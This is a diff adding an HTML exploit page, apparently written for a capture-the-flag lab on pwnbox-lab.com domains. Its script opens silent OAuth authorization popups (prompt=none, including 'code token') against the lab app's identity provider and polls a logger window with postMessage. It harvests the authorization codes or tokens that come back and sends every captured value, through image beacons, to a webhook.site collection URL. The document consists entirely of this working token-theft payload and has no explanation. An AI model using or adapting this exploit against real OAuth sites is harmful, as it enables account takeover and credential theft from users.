@@ -1,0 +1,37 @@
+<!doctype html>
+<meta charset="utf-8">
+<script>
+const APP = 'https://solo-leveling-3-4ba10b0a9545.pwnbox-lab.com';
+const IDP = 'https://google-4ba10b0a9545.pwnbox-lab.com';
+const LEAK = 'https://webhook.site/341d05fe-7e4f-4daa-99a9-9084174bc7d9';
+const RUN = 'p' + Math.random().toString(16).slice(2, 10);
+function ping(k, v) { new Image().src = LEAK + '?' + k + '=' + encodeURIComponent(v == null ? '1' : v) + '&run=' + RUN; }
+ping('loaded', location.href);
+const loggerWin = window.open(APP + '/logger', 'logger_' + RUN, 'width=520,height=420');
+ping('logger', loggerWin ? 'open' : 'blocked');
+function auth(rt, state, name) {
+  const u = IDP + '/o/oauth2/v2/auth'
+    + '?client_id=solo-leveling-3-client'
+    + '&redirect_uri=' + encodeURIComponent(APP + '/callback')
+    + '&response_type=' + encodeURIComponent(rt)
+    + '&scope=' + encodeURIComponent('openid email profile')
+    + '&prompt=none'
+    + '&state=' + encodeURIComponent(state);
+  const w = window.open(u, name, 'width=520,height=420');
+  ping(name, w ? 'open' : 'blocked');
+  return w;
+}
+const w1 = auth('code', 'C_' + RUN, 'idpCode_' + RUN);
+setTimeout(() => { const w2 = auth('code token', 'T_' + RUN, 'idpToken_' + RUN); }, 1200);
+const seen = new Set();
+window.addEventListener('message', (e) => {
+  if (!e.data || e.data.type !== 'loggerData') return;
+  const raw = e.data.data;
+  if (raw && !seen.has(raw)) { seen.add(raw); ping('raw', raw); }
+});
+const t = setInterval(() => {
+  for (const w of [loggerWin, w1]) { if (w) { try { w.postMessage({type:'get'}, '*'); } catch (err) {} } }
+}, 250);
+setTimeout(() => clearInterval(t), 12000);
+setTimeout(() => ping('done', [...seen].join('|').slice(0, 1800)), 13000);
+</script>
